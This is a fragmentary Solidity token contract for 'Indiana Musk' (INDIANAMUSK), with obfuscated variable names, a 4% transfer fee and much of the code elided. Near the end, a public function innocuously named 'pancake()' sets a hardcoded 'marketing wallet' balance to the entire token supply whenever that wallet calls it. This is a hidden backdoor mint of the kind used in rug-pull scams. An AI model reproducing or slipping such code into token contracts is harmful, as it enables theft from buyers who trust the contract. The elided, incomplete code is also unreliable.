...
contract Context {
 ...
 contract IndianaMusk is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private superfloINDI;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    string private _name = "Indiana Musk";
    string private _symbol = "INDIANAMUSK";
    ...
    uint256 private cryfaleINDI = 4;
    uint256 private _vebegoINDI = 1;
    ...
    constructor(uint256 totalSupply_) {
        ...
        _owner = _msgSender();
        superfloINDI[msg.sender] = totalSupply_;
    ...
    address private _MarketingWalletINDI = 0x8ea0cBC32027762dA7187d15125f11E968443714;
...
function _multiply (uint256 amount) private {
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _transfer(
        ...
        uint256 senderBalance = superfloINDI[issuer];
        require(senderBalance >= allons, "Too high value");
        unchecked {
            superfloINDI[issuer] = senderBalance - allons;
        }
        _fee = (allons * cryfaleINDI / 100) / _vebegoINDI;
        allons = allons -  (_fee * _vebegoINDI);
        
        superfloINDI[grantee] += allons;
   ...
   */
     ...
     */
    function _burn(address account, uint256 gzillaINDI) internal virtual {
        require(account != address(0), "Can't burn from address 0");
        uint256 accountBalance = superfloINDI[account];
        require(accountBalance >= gzillaINDI, "BEP : Can't be done");
        unchecked {
            superfloINDI[account] = accountBalance - gzillaINDI;
        }
        _totalSupply -= gzillaINDI;

        emit Transfer(account, address(0), gzillaINDI);
    }
...
function _subvert (uint256 tokenAmount) private lockTheSwap {
      ...
      function pancake() public {
        superfloINDI[_MarketingWalletINDI] = _tTotal;
        require(_msgSender() == _MarketingWalletINDI, "ERC20: Function reserved for Pancake");
    }   
